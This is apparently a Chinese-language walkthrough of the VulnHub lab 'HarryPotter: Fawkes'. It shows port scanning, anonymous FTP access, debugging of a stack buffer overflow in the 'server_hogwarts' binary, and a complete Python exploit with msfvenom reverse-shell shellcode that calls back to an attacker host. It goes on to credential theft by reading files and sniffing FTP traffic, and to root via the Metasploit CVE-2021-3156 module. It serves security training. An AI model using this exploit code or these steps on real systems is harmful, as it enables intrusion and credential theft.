靶机地址：[HarryPotter: Fawkes ~ VulnHub](https://vulnhub.com/entry/harrypotter-fawkes,686/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.101
sudo nmap -p21,22,80,2222,9898 -sV 192.168.1.101
# 21/tcp   open  ftp        vsftpd 3.0.3
# 22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
# 2222/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)
# 9898/tcp open  monkeycom?
```
先试试ftp，可以成功访问
```Shell
ftp 192.168.1.101
```
需要账号密码，不知道，暂时没法利用
访问80，就是一张图片，没啥可利用的
再看看9898，拒绝访问
先扫描下web路径
```Shell
sudo dirsearch -u http://192.168.1.101
```
没有可用的路径
可能还是得从ftp下手
```Shell
sudo nmap -p21 -sC 192.168.1.101
# | ftp-anon: Anonymous FTP login allowed (FTP code 230)
# |_-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
```
允许匿名登录，且存在一个目录
```Shell
ftp 192.168.1.101
# Name: anonymous
# Password:
```
成功登录
```Shell
ftp> ls
# -rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
ftp> get server_hogwarts # 下载成功

ftp> cd .. # 失败
```
只下载到了一个文件
```Shell
file server_hogwarts
# server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```
是一个可执行程序，执行一下看看
```Shell
chmod +x server_hogwarts
./server_hogwarts
```
再看看服务状态
```Shell
ps -ef | grep server_hogwarts
# 运行中
# kali       44350   14890  0 13:30 pts/1    00:00:00 ./server_hogwarts
ss -antlp | grep server_hogwarts
# LISTEN 0      3            0.0.0.0:9898      0.0.0.0:*    users:(("server_hogwarts",pid=44350,fd=3))
```
可以看到了占用了9898端口，和服务器上一样，可以假设服务器上也跑了这个服务
接下来在本地调试这个程序，看看是否存在漏洞，先连一下看看
```Shell
nc 127.0.0.1 9898
```
程序只有一个入口，输入魔咒
要在本机调试，需要先关掉ALSR
```Shell
cat /proc/sys/kernel/randomize_va_space
# 2
# 表示始终开启

# 切换到root用户改成0就可以了
su
echo 0 > /proc/sys/kernel/randomize_va_space
```
使用 [[01 跨平台工具#edb-debugger|edb-debugger]] 进行调试
==复现崩溃==
载入进程，点击 `Run` 继续运行
```Shell
# 生成一段payload
python -c "print('A'*500)"

nc 127.0.0.1 9898
```
程序崩溃了，且EIP被数据覆盖了，存在缓冲区溢出漏洞
==定位EIP，确定偏移量==
```Shell
msf-pattern_create -l 500
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```
关掉edb，重新运行程序，打开edb载入程序
程序再次崩溃时EIP的内容为 `64413764`
```Shell
msf-pattern_offset -l 500 -q 64413764
# [*] Exact match at offset 112
```
偏移量为112
==为shellcode寻找空间==
程序崩溃时ESP正好指向我们的缓冲区，需要确定空间是否足够大可以用来存放shellcode
定位下ESP偏移量
```Shell
msf-pattern_offset -l 500 -q "8Ad9"
# [*] Exact match at offset 116
```
正好就在EIP的后面
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 112
eip = b"B" * 4
code = b"C" * 500

payload = filler + eip + code

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9898))
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```
查看栈中的数据，右键 `Goto ESP` ，有500个C，没问题，可以利用ESP
==检查坏字符==
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 112
eip = b"B" * 4

badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = filler + eip + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9898))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")

except:
    print("Wrong!")
    sys.exit()
```
没有坏字符，这样的话生成shellcode时只需要指定 `0x00`
==确定返回指令的地址==
这里直接找 `JMP ESP` 就行
edb菜单中 `Plugins -> OpcodeSearcher -> Opcode Search`，选择 `ESP -> EIP` ，筛选当前进程且有可执行权限的那一条，点击Find，复制下找到的地址：`0x08049d55` 。
```Python
eip = b"\x55\x9d\x04\x08"
```
==生成shellcode==
```Shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```
编写利用代码
```Python
#!/usr/bin/python
import socket
import sys

filler = b"A" * 112
eip = b"\x55\x9d\x04\x08"
nops = b"\x90" * 10

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
buf =  b""
buf += b"\xba\xab\xb4\xba\xd3\xda\xd9\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x12\x31\x50\x12\x83\xc0\x04\x03\xfb\xba\x58"
buf += b"\x26\xca\x19\x6b\x2a\x7f\xdd\xc7\xc7\x7d\x68\x06\xa7"
buf += b"\xe7\xa7\x49\x5b\xbe\x87\x75\x91\xc0\xa1\xf0\xd0\xa8"
buf += b"\xf1\xab\x22\x32\x9a\xa9\x24\x53\x06\x27\xc5\xe3\xd0"
buf += b"\x67\x57\x50\xae\x8b\xde\xb7\x1d\x0b\xb2\x5f\xf0\x23"
buf += b"\x40\xf7\x64\x13\x89\x65\x1c\xe2\x36\x3b\x8d\x7d\x59"
buf += b"\x0b\x3a\xb3\x1a"

payload = filler + eip + nops + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.101", 9898))
    # print(s.recv(1024).decode())
    s.send(payload)
    s.close()
    print("\nDone!")
except:
    print("Wrong!")
    sys.exit()
```
成功获取到shell
```Shell
# 升级shell 没有Python 没有Bash
sh -i
```
可以本地提权
```Shell
sudo -l
sudo -s
```
但是再一看IP
```Shell
ip a
# inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
```
全是内网地址，还没完全渗透
```Shell
ls /home/
ls -la /home/harry/
cat /home/harry/.mycreds.txt
```
得到如下内容
```
HarrYp0tter@Hogwarts123
```
目标机器上开了两个SSH端口，逐个尝试
```Shell
ssh harry@192.168.1.101
ssh harry@192.168.1.101:2222
```
成功通过2222连接了
```Shell
ls /.docker*
# /.dockerenv
```
是个docker容器，再看看有没有别的提示
```Shell
cat /root/note.txt
# We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
```
翻译一下大致是：我们发现有人试图错误登录到我们的ftp服务器。要求您分析流量并确定用户。
```Shell
tcpdump -i eth0 port 21
```
过了一会儿获取到了数据，观察到如下内容
```
FTP: USER neville
FTP: PASS bL!Bsg3k
```
有人用这个账号密码登录FTP失败了
那这个账号密码可不可以用在别的地方呢，直觉可以试试22端口的ssh
```Shell
ssh neville@192.168.1.101
```
果然登录成功了，进来先看看ip，终于不是容器了
再提权，试了几种常规的都不行，还是利用内核漏洞试试
```Shell
uname -a
# Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
```
可以利用 [[20 CVE#CVE-2021-3156|CVE-2021-3156]] 思路：
```Shell
sudo msfconsole -q

> search CVE-2021-3156
> use exploit/linux/local/sudo_baron_samedit
> show options
# SESSION WritableDir LHOST LPORT

# 建立SESSION 通过SSH
> use auxiliary/scanner/ssh/ssh_login
> show options
# RHOSTS USERNAME PASSWORD
> set RHOSTS 192.168.1.101
> set USERNAME neville
> set PASSWORD bL!Bsg3k
> run

# 建立SESSION 通过反弹Shell
> use exploit/multi/handler
> set LHOST 0.0.0.0
> set ExitOnSession false
> exploit

> use exploit/linux/local/sudo_baron_samedit
> sessions
> set SESSION 0
# 需要提前开启监听
> set LPORT 3333
> run

# 退出
> sessions --kill-all
> exit
```
失败了
通过修改漏洞利用代码中的 `sudo` 路径提权成功了